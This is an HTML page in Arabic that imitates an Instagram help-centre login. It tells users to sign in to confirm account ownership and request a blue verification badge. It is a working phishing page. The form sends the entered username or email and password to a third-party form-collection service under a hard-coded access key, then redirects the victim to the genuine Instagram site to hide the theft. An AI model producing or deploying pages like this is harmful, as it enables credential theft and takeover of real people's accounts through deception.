<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - مركز المساعدة</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 30px;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin: 20px 0 30px 0;
        }
        .instr-text {
            color: #8e8e8e;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 25px;
            line-height: 1.4;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: #1877f2;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .or-divider::before, .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .or-divider span { padding: 0 15px; font-weight: 600; }
        
        .footer-link {
            margin-top: 15px;
            font-size: 12px;
            color: #385185;
            text-decoration: none;
            display: block;
        }
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 100%;
            max-width: 350px;
            margin-top: 10px;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" alt="Instagram" class="logo">
    <p class="instr-text">يرجى تسجيل الدخول لتأكيد ملكية الحساب وطلب شارة التحقق الزرقاء</p>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="07448344-92a7-4aab-b61e-7e8b136f4bd7">
        
        <input type="text" name="Username_or_Email" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" name="Password" placeholder="كلمة المرور" required>
        
        <input type="hidden" name="redirect" value="https://www.instagram.com/accounts/manage_access/">

        <button type="submit">تسجيل الدخول</button>
        
        <div class="or-divider"><span>أو</span></div>
        <a href="#" class="footer-link">هل نسيت كلمة السر؟</a>
    </form>
</div>

<div class="signup-box">
    ليس لديك حساب؟ <span style="color: #0095f6; font-weight: 600; cursor: pointer;">تسجيل</span>
</div>

</body>
</html>
